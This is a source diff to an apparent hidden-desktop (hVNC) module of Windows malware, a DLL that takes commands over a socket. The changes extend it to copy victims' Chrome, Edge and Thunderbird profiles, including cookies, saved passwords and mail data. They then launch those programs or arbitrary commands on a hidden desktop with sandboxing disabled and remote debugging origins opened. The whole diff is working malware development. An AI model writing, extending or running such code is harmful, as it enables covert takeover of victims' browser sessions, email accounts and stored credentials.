@@ -1134,25 +1134,54 @@ static wstring get_browser_path(const wstring& browser_exe) {
     wchar_t path[MAX_PATH];
     DWORD size = sizeof(path);
     wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser_exe;
+    bool found = false;
+
     if (RegGetValueW(HKEY_LOCAL_MACHINE, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
-        return path;
+        found = true;
+    } else {
+        size = sizeof(path);
+        if (RegGetValueW(HKEY_CURRENT_USER, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
+            found = true;
+        }
     }
-    size = sizeof(path);
-    if (RegGetValueW(HKEY_CURRENT_USER, subkey.c_str(), NULL, RRF_RT_REG_SZ, NULL, path, &size) == ERROR_SUCCESS) {
-        return path;
+
+    if (!found) {
+        if (browser_exe == L"chrome.exe") {
+            if (std::filesystem::exists(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")) return L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+            if (std::filesystem::exists(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")) return L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
+        } else if (browser_exe == L"msedge.exe") {
+            if (std::filesystem::exists(L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe")) return L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
+            if (std::filesystem::exists(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")) return L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+        } else if (browser_exe == L"thunderbird.exe") {
+            if (std::filesystem::exists(L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe")) return L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
+            if (std::filesystem::exists(L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe")) return L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+        }
+        return L"";
     }
-    return L"";
+
+    wstring res = path;
+    if (!res.empty() && res.front() == L'\"') {
+        res.erase(0, 1);
+        if (!res.empty() && res.back() == L'\"') res.pop_back();
+    }
+    return res;
 }
 
 static void copy_recursive(const wstring& source, const wstring& destination) {
     namespace fs = std::filesystem;
     try {
         if (fs::is_directory(source)) {
+            wstring name = fs::path(source).filename().wstring();
+            if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
+                name == L"Service Worker" || name == L"Media Cache" || name == L"WebStorage" ||
+                name == L"crash_reporter" || name == L"GrShaderCache") return;
+
             fs::create_directories(destination);
             for (const auto& entry : fs::directory_iterator(source)) {
-                wstring name = entry.path().filename().wstring();
-                if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") continue;
-                copy_recursive(entry.path().wstring(), destination + L"\\" + name);
+                wstring child_name = entry.path().filename().wstring();
+                if (child_name == L"SingletonLock" || child_name == L"SingletonCookie" ||
+                    child_name == L"Parent.lock" || child_name == L"lockfile") continue;
+                copy_recursive(entry.path().wstring(), destination + L"\\" + child_name);
             }
         } else {
             CopyFileW(source.c_str(), destination.c_str(), FALSE);
@@ -1162,13 +1191,18 @@ static void copy_recursive(const wstring& source, const wstring& destination) {
 
 static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
     wchar_t localAppData[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return false;
+    wchar_t roamingAppData[MAX_PATH];
+
+    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
+    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roamingAppData);
 
     wstring source_path;
     if (browser_name == L"chrome.exe") {
         source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
     } else if (browser_name == L"msedge.exe") {
         source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+    } else if (browser_name == L"thunderbird.exe") {
+        source_path = wstring(roamingAppData) + L"\\Thunderbird";
     } else {
         return false;
     }
@@ -1196,33 +1230,72 @@ static bool create_browser_clone(const wstring& browser_name, wstring& target_da
 }
 
 static void launch_browser_thread(wstring browser_name) {
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     wstring target_data_dir;
     if (!create_browser_clone(browser_name, target_data_dir)) {
         send_error("Failed to clone browser profile");
+        CoUninitialize();
         return;
     }
 
     wstring browser_path = get_browser_path(browser_name);
     if (browser_path.empty()) {
         send_error("Browser not found");
+        CoUninitialize();
         return;
     }
 
     send_status("program başlatılıyor");
 
-    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity";
+    wstring cmdLine;
+    LPVOID lpEnv = NULL;
+    if (browser_name == L"thunderbird.exe") {
+        cmdLine = L"\"" + browser_path + L"\"";
+
+        LPWCH currentEnv = GetEnvironmentStringsW();
+        if (currentEnv) {
+            vector<wchar_t> envVec;
+            LPWCH ptr = currentEnv;
+            while (*ptr) {
+                wstring entry = ptr;
+                if (_wcsnicmp(entry.c_str(), L"APPDATA=", 8) != 0) {
+                    for (wchar_t c : entry) envVec.push_back(c);
+                    envVec.push_back(L'\0');
+                }
+                ptr += entry.length() + 1;
+            }
+            wstring appDataEnv = L"APPDATA=" + target_data_dir;
+            for (wchar_t c : appDataEnv) envVec.push_back(c);
+            envVec.push_back(L'\0');
+            envVec.push_back(L'\0');
+
+            lpEnv = malloc(envVec.size() * sizeof(wchar_t));
+            memcpy(lpEnv, envVec.data(), envVec.size() * sizeof(wchar_t));
+            FreeEnvironmentStringsW(currentEnv);
+        }
+    } else {
+        cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-first-run --no-default-browser-check --disable-sync --disable-infobars --disable-notifications --remote-allow-origins=* --no-sandbox --disable-gpu --disable-gpu-compositing --disable-software-rasterizer --disable-dev-shm-usage --password-store=basic --disable-features=RendererCodeIntegrity,CalculateNativeWinOcclusion --disable-backgrounding-occluded-windows --disable-renderer-backgrounding --window-size=1920,1080 --start-maximized";
+    }
+
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
+    wstring browserDir = fs::path(browser_path).parent_path().wstring();
     wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-    STARTUPINFOW si = { sizeof(si) };
-    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-    si.dwFlags      = STARTF_USESHOWWINDOW;
-    si.wShowWindow  = SW_SHOW;
 
-    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOW si;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    PROCESS_INFORMATION pi;
+    memset(&pi, 0, sizeof(pi));
+
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
-                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB,
+                       lpEnv, browserDir.c_str(), &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         g_forceFullFrame = true;
@@ -1230,6 +1303,9 @@ static void launch_browser_thread(wstring browser_name) {
     } else {
         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
     }
+
+    if (lpEnv) free(lpEnv);
+    CoUninitialize();
 }
 
 static wstring utf8_to_wstring(const string& str) {
@@ -1307,21 +1383,36 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (!g_hHiddenDesktop) return;
 
             wstring pathStr = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            if (pathStr == L"chrome.exe" || pathStr == L"msedge.exe") {
+            if (pathStr == L"chrome.exe" || pathStr == L"msedge.exe" || pathStr == L"thunderbird.exe") {
                 thread(launch_browser_thread, pathStr).detach();
             } else {
-                vector<wchar_t> cmdLine(pathStr.begin(), pathStr.end());
-                cmdLine.push_back(L'\0');
+                wstring cmdLine = pathStr;
+                if (_wcsicmp(pathStr.c_str(), L"explorer.exe") == 0) {
+                    cmdLine += L" /separate";
+                }
+
+                vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
+                cmdVec.push_back(L'\0');
+
+                wstring workingDir = L"";
+                if (cmdLine.find(L"\\") != wstring::npos) {
+                    workingDir = fs::path(cmdLine).parent_path().wstring();
+                }
 
                 wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-                STARTUPINFOW si = { sizeof(si) };
-                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-                si.dwFlags      = STARTF_USESHOWWINDOW;
-                si.wShowWindow  = SW_SHOW;
+                STARTUPINFOW si;
+                memset(&si, 0, sizeof(si));
+                si.cb = sizeof(si);
+                si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_SHOW;
 
-                PROCESS_INFORMATION pi = { 0 };
-                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                PROCESS_INFORMATION pi;
+                memset(&pi, 0, sizeof(pi));
+
+                if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB,
+                                   NULL, workingDir.empty() ? NULL : workingDir.c_str(), &si, &pi)) {
                     CloseHandle(pi.hProcess);
                     CloseHandle(pi.hThread);
                     g_forceFullFrame = true;
